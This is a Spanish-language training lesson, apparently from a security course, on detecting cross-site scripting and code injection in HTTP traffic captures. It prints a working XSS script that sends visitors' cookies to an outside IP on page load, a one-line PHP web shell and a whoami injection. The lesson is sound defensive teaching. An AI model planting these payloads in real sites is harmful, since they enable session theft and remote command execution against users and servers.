# Cross-Site Scripting (XSS) & Code Injection Detection

**Archivo PCAP relacionado**:

- `XSS_Simple.pcapng`

---

Supongamos que estábamos revisando nuestras solicitudes HTTP y notamos que se enviaba una buena cantidad de solicitudes a un "servidor" interno, no reconocimos. Esto podría ser una clara indicación de secuencias de comandos de sitios cruzados. Tomemos la siguiente salida, por ejemplo.

![](https://academy.hackthebox.com/storage/modules/229/1-XSS.png)

Podríamos notar que se envían muchos valores, y en casos reales esto podría no ser tan obvio que estas son cookies/tokens de los usuarios. En cambio, incluso podría estar codificado o encriptado mientras está en tránsito. Esencialmente hablando, los secuencias de comandos entre sitios trabajan a través de un atacante inyectando un código de script o script malicioso en una de nuestras páginas web a través de la entrada del usuario. Cuando otros usuarios visiten nuestro servidor web, sus navegadores ejecutarán este código. Los atacantes en muchos casos utilizarán esta técnica para robar tokens, cookies, valores de sesión y más. Si tuviéramos que seguir una de estas solicitudes, se vería como las siguientes.

![](https://academy.hackthebox.com/storage/modules/229/2-XSS_.png)

Llegar a la raíz de donde se origina este código puede ser algo complicado. Sin embargo, supongamos que teníamos un área de comentarios de usuario en nuestro servidor web. Podríamos notar que uno de los comentarios se parece a los siguientes.

Código:javascript

```jsx
<script>
  window.addEventListener("load", function() {
    const url = "http://192.168.0.19:5555";
    const params = "cookie=" + encodeURIComponent(document.cookie);
    const request = new XMLHttpRequest();
    request.open("GET", url + "?" + params);
    request.send();
  });
</script>

```

Esto sería una exitosa secuencia de comandos de sitios cruzados del atacante, y como tal, quisiéramos eliminar este comentario rápidamente, e incluso en la mayoría de los casos derribar nuestro servidor para solucionar el problema antes de que persista. También podríamos notar en algunos casos, que un atacante podría intentar inyectar código en estos campos como los siguientes dos ejemplos.

Para que puedan obtener el comando y el control a través de PHP.

Código:php

```php
<?php system($_GET['cmd']);?>
```

O para ejecutar un solo comando con php:

Código:php

```php
<?php echo `whoami`?>
```

### **Prevención de XSS e inyección de código**

Para evitar estas amenazas después de detectarlas, podemos hacer lo siguiente.

1. `Sanitize and handle user input in an acceptable manner.`
2. `Do not interpret user input as code.`